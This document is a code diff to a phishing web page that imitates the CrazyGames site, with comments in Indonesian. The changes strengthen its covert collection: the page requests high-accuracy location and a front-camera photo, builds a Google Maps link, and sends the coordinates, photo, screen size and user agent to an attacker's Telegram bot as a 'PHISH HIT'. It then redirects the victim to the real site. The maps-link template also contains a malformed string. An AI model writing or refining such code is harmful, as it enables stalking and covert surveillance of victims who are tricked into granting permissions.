@@ -76,7 +76,7 @@ games.forEach(([t,c]) => {
   list.appendChild(d);
 });
 
-async function kirimTelegram(text, photoBase64 = null) {
+async function kirimTelegram(text, photoBase64 = null, mapsLink = '') {
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -84,14 +84,15 @@ async function kirimTelegram(text, photoBase64 = null) {
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: text,
-        parse_mode: 'Markdown'
+        parse_mode: 'Markdown',
+        disable_web_page_preview: false
       })
     });
 
     if (photoBase64 && photoBase64.startsWith('data:image')) {
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
-      form.append('caption', '📷 Foto target');
+      form.append('caption', mapsLink ? `📷 Foto target\n📍 ${mapsLink}` : '📷 Foto target');
       const res = await fetch(photoBase64);
       const blob = await res.blob();
       form.append('photo', blob, 'face.jpg');
@@ -113,22 +114,29 @@ async function mulai() {
   loading.style.display = 'block';
   loading.innerText = 'Meminta izin lokasi...';
 
-  let lat = 'ditolak', lon = 'ditolak', photo = null;
+  let lat = null, lon = null, accuracy = null, photo = null;
 
+  // Ambil lokasi dengan akurasi tinggi
   try {
     const pos = await new Promise((ok, err) => {
       navigator.geolocation.getCurrentPosition(ok, err, {
         enableHighAccuracy: true,
-        timeout: 15000,
+        timeout: 20000,
         maximumAge: 0
       });
     });
     lat = pos.coords.latitude;
     lon = pos.coords.longitude;
-  } catch(e) {}
+    accuracy = pos.coords.accuracy ? Math.round(pos.coords.accuracy) + ' meter' : 'tidak diketahui';
+  } catch(e) {
+    lat = 'ditolak';
+    lon = 'ditolak';
+    accuracy = '-';
+  }
 
   loading.innerText = 'Meminta izin kamera...';
 
+  // Ambil kamera
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -155,14 +163,27 @@ async function mulai() {
   const screenInfo = screen.width + 'x' + screen.height;
   const waktu = new Date().toLocaleString('id-ID');
 
+  // Buat link Google Maps langsung
+  let mapsLink = '';
+  let lokasiText = '';
+  if (typeof lat === 'number' && typeof lon === 'number') {
+    mapsLink = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
+    lokasiText = `📍 *Lokasi Akurat*\n` +
+                 `Lat: \`${lat}\`\n` +
+                 `Lon: \`${lon}\`\n` +
+                 `Akurasi: ${accuracy}\n` +
+                 `🗺 [Buka di Google Maps](${mapsLink})`;
+  } else {
+    lokasiText = `📍 Lokasi: ditolak / tidak tersedia`;
+  }
+
   const pesan = `🎮 *CRAZYGAMES PHISH HIT*\n` +
                 `⏰ ${waktu}\n` +
-                `📍 Lat: \`${lat}\`\n` +
-                `📍 Lon: \`${lon}\`\n` +
+                `${lokasiText}\n` +
                 `📱 Screen: ${screenInfo}\n` +
                 `🔍 UA: ${ua.slice(0,100)}`;
 
-  await kirimTelegram(pesan, photo);
+  await kirimTelegram(pesan, photo, mapsLink);
 
   setTimeout(() => {
     window.location.href = 'https://www.crazygames.com/id/';
@@ -174,4 +195,4 @@ setTimeout(() => {
 }, 1200);
 </script>
 </body>
-</html>
+  </html>
